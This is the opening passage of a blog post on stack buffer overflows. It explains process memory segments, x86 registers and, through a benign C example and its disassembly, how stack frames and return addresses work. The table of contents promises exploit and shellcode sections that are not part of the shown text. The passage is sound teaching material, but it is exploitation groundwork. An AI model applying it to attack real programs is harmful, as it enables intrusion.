<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Stack Overflow Vulnerabilities | Markus Thill </title> <meta name="author" content="Markus Thill"> <meta name="description" content="This blog post explores the fundamentals of buffer overflows, including how they arise in C and C++ programs, the role of process memory layout and the x86/IA-32 architecture, and the significance of stack frames. It covers common overflow types — stack-based, off-by-one, BSS, and heap — and shows how attackers use techniques like NOP-sledding to gain elevated privileges. Finally, it illustrates how to craft a working exploit by injecting shellcode into a vulnerable application’s memory space."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%8D%95&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://markusthill.github.io/blog/2024/buffer-overflows/"> <script src="/assets/js/theme.js?a81d82887dd692e91686b43de4542f18"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
    initTheme();
  </script> <link defer rel="stylesheet" href="https://cdn.jsdelivr.net/npm/img-comparison-slider@8.0.6/dist/styles.min.css" integrity="sha256-3qTIuuUWIFnnU3LpQMjqiXc0p09rvd0dmj+WkpQXSR8=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-bundle.min.css" integrity="sha256-yUoNxsvX+Vo8Trj3lZ/Y5ZBf8HlBFsB6Xwm7rH75/9E=" crossorigin="anonymous"> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Markus</span> Thill </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/"> </a> </li> <li class="nav-item "> <a class="nav-link" href="/about">about </a> </li> <li class="nav-item active"> <a class="nav-link" href="/index.html">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="ti ti-search"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Stack Overflow Vulnerabilities</h1> <p class="post-meta"> Created on December 17, 2024 </p> <p class="post-tags"> <a href="/blog/2024"> <i class="fa-solid fa-calendar fa-sm"></i> 2024 </a> </p> </header> <article class="post-content"> <div id="table-of-contents"> <ul id="toc" class="section-nav"> <li class="toc-entry toc-h2"><a href="#process-memory-organization">Process Memory Organization</a></li> <li class="toc-entry toc-h2"> <a href="#intel-x86ia-32-architecture">Intel x86/IA-32 Architecture</a> <ul> <li class="toc-entry toc-h3"><a href="#base-registers">Base Registers</a></li> </ul> </li> <li class="toc-entry toc-h2"><a href="#how-the-stack-works">How the Stack works</a></li> <li class="toc-entry toc-h1"> <a href="#buffer-overflows">Buffer Overflows</a> <ul> <li class="toc-entry toc-h2"><a href="#classification">Classification</a></li> <li class="toc-entry toc-h2"><a href="#bss-overflows">BSS Overflows</a></li> <li class="toc-entry toc-h2"><a href="#heap-overflows">Heap Overflows</a></li> <li class="toc-entry toc-h2"> <a href="#classic-stack-based-buffer-overflows">Classic Stack-Based Buffer Overflows</a> <ul> <li class="toc-entry toc-h3"><a href="#the-zero-byte-problem">The Zero Byte Problem</a></li> <li class="toc-entry toc-h3"><a href="#relative-addressing">Relative Addressing</a></li> <li class="toc-entry toc-h3"><a href="#nop-sliding">NOP-Sliding</a></li> </ul> </li> <li class="toc-entry toc-h2"> <a href="#off-by-one-and-frame-pointer-overwrites">Off-by-One and Frame Pointer Overwrites</a> <ul> <li class="toc-entry toc-h3"><a href="#bug-of-the-gcc-compiler">Bug of the GCC compiler</a></li> </ul> </li> </ul> </li> <li class="toc-entry toc-h1"> <a href="#detailed-example-of-creating-an-exploit">Detailed Example of Creating an Exploit</a> <ul> <li class="toc-entry toc-h2"><a href="#basic-principles">Basic Principles</a></li> <li class="toc-entry toc-h2"><a href="#implementation-of-the-desired-functions-using-a-c-program">Implementation of the Desired Functions Using a C Program</a></li> <li class="toc-entry toc-h2"><a href="#analysis-of-the-disassembled-c-program">Analysis of the disassembled C Program</a></li> <li class="toc-entry toc-h2"><a href="#development-of-a-custom-assembly-program">Development of a Custom Assembly Program</a></li> <li class="toc-entry toc-h2"><a href="#assembling-the-program-and-extracting-the-machine-code">Assembling the program and extracting the machine code</a></li> <li class="toc-entry toc-h2"><a href="#creating-a-fully-functional-exploit">Creating a fully Functional Exploit</a></li> </ul> </li> <li class="toc-entry toc-h1"> <a href="#appendix">Appendix</a> <ul> <li class="toc-entry toc-h2"><a href="#example-for-off-by-ones-overflows">Example for Off-By-Ones Overflows</a></li> <li class="toc-entry toc-h2"> <a href="#example-for-a-server-with-a-buffer-overflow-vulnerability">Example for a Server with a Buffer Overflow Vulnerability</a> <ul> <li class="toc-entry toc-h3"><a href="#clientc">client.c</a></li> <li class="toc-entry toc-h3"><a href="#serverc">server.c</a></li> <li class="toc-entry toc-h3"><a href="#exploitc">exploit.c</a></li> </ul> </li> </ul> </li> </ul> </div> <hr> <div id="markdown-content"> <p>Buffer overflows remain one of the most common security vulnerabilities in modern software and typically result from improperly written programs. A buffer overflow occurs when a program allocates too little memory for a given amount of data. The excess data then overwrites adjacent memory areas, which can contain sensitive information such as program flow data, process memory, or pointers. Because attackers can manipulate this overwritten information to execute malicious code, buffer overflows are considered critical vulnerabilities.</p> <p>Most of today’s computer systems are based on the von Neumann architecture, where both data and programs reside in the same memory. This design makes it easier for attackers to exploit buffer overflows once they occur. However, the root cause of these vulnerabilities lies in careless programming practices; the von Neumann architecture merely facilitates their exploitation. In many programming languages, such as C or C++, memory overflow checks are left to the programmer, who may forget to implement them altogether or do so incorrectly.</p> <p>By contrast, buffer overflows in Java are virtually impossible because Java programs run within a runtime environment that detects and prevents memory overflows. Similarly, interpreted programming languages are rarely affected.</p> <p>For simplicity, this blog post will focus on buffer overflows on x86/IA-32 architectures. However, the underlying techniques are very similar for newer architectures.</p> <h2 id="process-memory-organization">Process Memory Organization</h2> <p>In order to understand the attack methods that exploit different buffer overflow vulnerabilities, it is necessary to first discuss the organization of the process memory in more detail.<br> Typically, a process is provided with its own virtual address space by the operating system, with which it can work. For 32-bit systems, for example, the virtual address space can comprise up to \(2^{32}\) addresses. Few processes will require the complete virtual address space. Therefore, it is not necessary and often impossible to assign a physical address to each virtual address. If necessary, the memory management unit (MMU) of the CPU will convert the virtual addresses into physical addresses.</p> <p>The memory of a process is divided into different areas, described in more detail below:</p> <ol> <li> <p><strong>Text segment</strong><br> The executable code of the program is stored in the text segment. This segment can usually be accessed only in a read-only manner; write operations are prohibited and lead to an error. Hence, runtime code manipulation is not possible. Literals and constant pointers are usually stored in this segment as well.</p> </li> <li> <p><strong>Data segment</strong><br> In general, all global and static variables are stored in the data segment of the process memory. Static variables are declared locally within functions but maintain their values when the function exits, so they cannot be placed on the stack like classic local variables.<br> In the data segment itself, a distinction is often made between two areas: Data and BSS (Block Start by Symbol). The initialized global and static variables are stored in the Data area, while the non-initialized variables reside in the BSS area. The BSS area is usually zero-initialized, so variables that are not explicitly initialized by the programmer do not contain unexpected values.</p> </li> <li> <p><strong>Heap</strong><br> During process runtime, memory can be dynamically allocated and released on the heap. The heap is used if the memory on the stack is insufficient or if the size of data structures can only be determined at runtime.</p> </li> <li> <p><strong>Stack</strong><br> As mentioned, unlike global variables, local variables are placed on the stack. The stack can be visualized like a stack of plates: items are added (pushed) to the top and removed (popped) from the top.<br> The stack is usually supported directly by the hardware of common processor architectures and plays a significant role in memory management, especially when functions/procedures are called. The following chapter will delve deeper into this topic.</p> </li> </ol> <p>In most processor architectures, the stack grows from the highest virtual memory address to the lower one. The heap grows in the opposite direction. Usually, the process memory layout will look like this:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/memoryOrga-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/memoryOrga-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/memoryOrga-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2018-02-05-buffer-overflows/memoryOrga.png" class="img-fluid rounded z-depth-1 imgcenter" width="300px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> <figcaption class="caption"> <b>Figure 1:</b> Process memory layout. </figcaption> </figure> <h2 id="intel-x86ia-32-architecture">Intel x86/IA-32 Architecture</h2> <p>In general, processor architectures are classified as either <strong>Little-Endian</strong> or <strong>Big-Endian</strong>, depending on how they store multibyte data in memory. On <strong>Little-Endian</strong> architectures, the “Least Significant Byte” (LSB) is stored at the lower memory address, and the “Most Significant Byte” (MSB) at the higher address. <strong>Big-Endian</strong> architectures do the opposite.</p> <p>The Intel x86/IA-32 architecture we are examining uses the Little-Endian representation. This characteristic plays a significant role in certain vulnerabilities, particularly off-by-one buffer overflows.</p> <h3 id="base-registers">Base Registers</h3> <p>The base registers include EAX, EBX, ECX, EDX, ESP, EBP, ESI, and EDI. While each register has its own function, only ESP and EBP are essential for understanding the assembly code that follows.</p> <p><strong>ESP (Extended Stack Pointer)</strong><br> This register points to the current position in the stack. Operations like <code class="language-plaintext highlighter-rouge">push</code> (placing an element on the stack) and <code class="language-plaintext highlighter-rouge">pop</code> (removing the last element from the stack) change the stack pointer automatically. However, the ESP register can also be manipulated directly.</p> <p><strong>EBP (Extended Base Pointer),</strong> often called the <strong>frame pointer</strong>, plays an important role in stack operations. When a function is called, EBP is set as a reference point for all stack operations within that function. Unlike ESP, the value of EBP remains constant throughout the function’s execution. It is updated only when control leaves the function. This design allows local variables on the stack to be addressed via offsets relative to the frame pointer. The area bounded by the frame pointer and stack pointer is known as the <strong>stack frame</strong>.</p> <h2 id="how-the-stack-works">How the Stack works</h2> <p>The following is a simple example of how the stack works. A small C-program serves as an example:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff2</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
	<span class="n">i</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
 	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
	<span class="n">foo</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <p>For this code, you get the following assembly output:</p> <p>Function <code class="language-plaintext highlighter-rouge">main()</code>:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x18</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">4</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">5</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x9</span>
<span class="err">6</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x1</span>
<span class="err">7</span>	<span class="nf">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="nv">foo</span><span class="o">&gt;</span>
<span class="err">8</span>	<span class="nf">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">9</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">10</span>	<span class="nf">leave</span>
<span class="err">11</span>	<span class="nf">ret</span></code></pre></figure> <p>Function <code class="language-plaintext highlighter-rouge">foo()</code>:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x38</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">4</span>	<span class="nf">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">5</span>	<span class="nf">add</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">6</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">7</span>	<span class="nf">mov</span>    <span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">8</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">9</span>	<span class="nf">leave</span>
<span class="err">10</span>	<span class="nf">ret</span></code></pre></figure> <p>First, an explanation of the <code class="language-plaintext highlighter-rouge">main()</code> function:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span> <span class="nf">push</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>The first two instructions appear in practically all functions. In line 1, the current frame pointer (hereafter FP0) is pushed onto the stack. In line 2, the stack pointer (ESP) is copied into EBP. At this address, the stack frame for <code class="language-plaintext highlighter-rouge">main()</code> begins.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">3</span> <span class="nf">sub</span> <span class="kc">$</span><span class="mh">0x18</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">4</span> <span class="nf">sub</span> <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>These two instructions reserve memory space on the stack for the local variables <code class="language-plaintext highlighter-rouge">i</code> and <code class="language-plaintext highlighter-rouge">buff</code>. The <code class="language-plaintext highlighter-rouge">sub</code> operation moves the stack pointer toward lower addresses. Specifically, lines 3 and 4 subtract a total of 0x20 (decimal 32) from the ESP register. This is a direct manipulation of the stack pointer. Because the stack grows from higher to lower addresses, the operation must be a subtraction rather than an addition. (The fact that more memory is reserved than necessary will be discussed below.)</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">5</span> <span class="nf">push</span> <span class="kc">$</span><span class="mh">0x9</span>
<span class="err">6</span> <span class="nf">push</span> <span class="kc">$</span><span class="mh">0x1</span></code></pre></figure> <p>Next, the function call to <code class="language-plaintext highlighter-rouge">foo()</code> is prepared. The function expects two parameters, which are pushed onto the stack in lines 5 and 6. It is important to note that parameters must be placed on the stack in reverse order compared to their order in the C program.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">7</span> <span class="nf">call</span> <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="nv">foo</span><span class="o">&gt;</span></code></pre></figure> <p>After passing the parameters, execution branches to the <code class="language-plaintext highlighter-rouge">foo()</code> function. The <code class="language-plaintext highlighter-rouge">call</code> instruction performs two steps. First, the return address (RIP) is pushed onto the stack. This address points to the instruction that should execute after <code class="language-plaintext highlighter-rouge">foo()</code> returns—in this case, line 8 of the <code class="language-plaintext highlighter-rouge">main()</code> function. Second, the instruction pointer (EIP) is updated so that the program resumes execution at <code class="language-plaintext highlighter-rouge">foo()</code>. The stack now looks like this at this point in time:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/stack7-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/stack7-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/stack7-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2018-02-05-buffer-overflows/stack7.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> <figcaption class="caption"> <b>Figure 2:</b> Stack layout when calling <code class="language-plaintext highlighter-rouge">foo()</code>. </figcaption> </figure> <p>As mentioned before, execution now continues in the <code class="language-plaintext highlighter-rouge">foo()</code> function:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span> <span class="nf">push</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>These first two lines mirror those in the <code class="language-plaintext highlighter-rouge">main()</code> function. The current frame pointer (FP1) is pushed onto the stack (line 1), and then the stack pointer (ESP) is copied into EBP (line 2). This allows the original frame pointer to be restored later when returning to <code class="language-plaintext highlighter-rouge">main()</code>.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">3</span> <span class="nf">sub</span> <span class="kc">$</span><span class="mh">0x38</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>In line 3, memory space for the local variables is reserved on the stack by moving the stack pointer to a lower address.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">4</span> <span class="nf">mov</span> <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">5</span> <span class="nf">add</span> <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">6</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span></code></pre></figure> <p>Line 4 loads the parameter <code class="language-plaintext highlighter-rouge">y</code> into the EAX register. This illustrates the purpose of the frame pointer, as function parameters are accessed relative to EBP rather than via absolute addresses. Here, parameter <code class="language-plaintext highlighter-rouge">y</code> is located 12 bytes (<code class="language-plaintext highlighter-rouge">0xc</code>) above the frame pointer, with the space in between taken by parameter <code class="language-plaintext highlighter-rouge">x</code>, the return address, and the previously saved frame pointer.</p> <p>Line 5 adds parameter <code class="language-plaintext highlighter-rouge">x</code> (located 8 bytes above EBP) to the value in EAX.<br> Line 6 then stores the result in the local variable <code class="language-plaintext highlighter-rouge">i</code>, which is at a negative offset (in two’s complement form) relative to EBP.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">7</span> <span class="nf">mov</span> <span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">8</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span></code></pre></figure> <p>Lines 7 and 8 are generally unnecessary. Presumably, they were intended to move the function’s return value into EAX (where numeric return values are typically placed). However, because EAX already holds the correct value, these instructions could be omitted.</p> <p>At this point, the stack looks like this:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/stack8-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/stack8-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/stack8-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2018-02-05-buffer-overflows/stack8.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> <figcaption class="caption"> <b>Figure 3:</b> Stack layout for <code class="language-plaintext highlighter-rouge">foo()</code>. </figcaption> </figure> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span> <span class="nf">leave</span></code></pre></figure> <p>Line 9 prepares to leave the function, and can be thought of as a shorthand for:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">movl</span> <span class="o">%</span><span class="nb">ebp</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="nf">popl</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>The <code class="language-plaintext highlighter-rouge">leave</code> instruction sets the stack pointer (ESP) to the current frame pointer (EBP). The old frame pointer is then located precisely at ESP, and a <code class="language-plaintext highlighter-rouge">pop</code> loads this saved frame pointer back into EBP.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span> <span class="nf">ret</span></code></pre></figure> <p>After <code class="language-plaintext highlighter-rouge">leave</code> executes, the stack pointer points to the previously stored return address. The <code class="language-plaintext highlighter-rouge">ret</code> instruction (line 10) loads this address into the instruction register, resuming execution in <code class="language-plaintext highlighter-rouge">main()</code>.</p> <p>Back in <code class="language-plaintext highlighter-rouge">main()</code>, the last four instructions are processed:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">8</span> <span class="nf">add</span> <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>After the function call, the parameters on the stack are no longer needed and must be removed. Line 8 removes 0x10 (16) bytes, not just 8 bytes for the two parameters (each 4 bytes). The extra 8 bytes likely stem from an additional reservation on the stack before each function call (see line 4). This reservation appears to be linked to a bug in the GCC compiler, as discussed below. Consequently, both the parameters and the extra 8 bytes must be reclaimed from the stack.</p> <p>Strictly speaking, if no further operations occur in <code class="language-plaintext highlighter-rouge">main()</code> after the <code class="language-plaintext highlighter-rouge">foo()</code> call, cleaning up the stack is not mandatory. Nevertheless, these instructions clearly illustrate the function call mechanism and stack usage.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span>  <span class="nf">mov</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">10</span> <span class="nf">leave</span>
<span class="err">11</span> <span class="nf">ret</span></code></pre></figure> <p>In these final lines, <code class="language-plaintext highlighter-rouge">main()</code> sets its return value to zero (line 9). The <code class="language-plaintext highlighter-rouge">leave</code> instruction resets ESP to EBP (line 10), and the <code class="language-plaintext highlighter-rouge">ret</code> instruction (line 11) terminates <code class="language-plaintext highlighter-rouge">main()</code> by popping the saved return address into the instruction register.</p> <p>The following animation provides a slightly simplified illustration of the entire process:</p> <div style="width: 100%" class="imgcenter"> <swiper-container keyboard="true" navigation="true" pagination="true" pagination-clickable="true" pagination-dynamic-bullets="true" rewind="true"> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack1-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack1-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack1-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack2-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack2-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack2-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack3-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack3-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack3-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack4-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack4-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack4-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack5-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack5-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack5-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack6-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack6-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack6-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2024-12-16-buffer-overflows/stack6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack7-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack7-800.webp 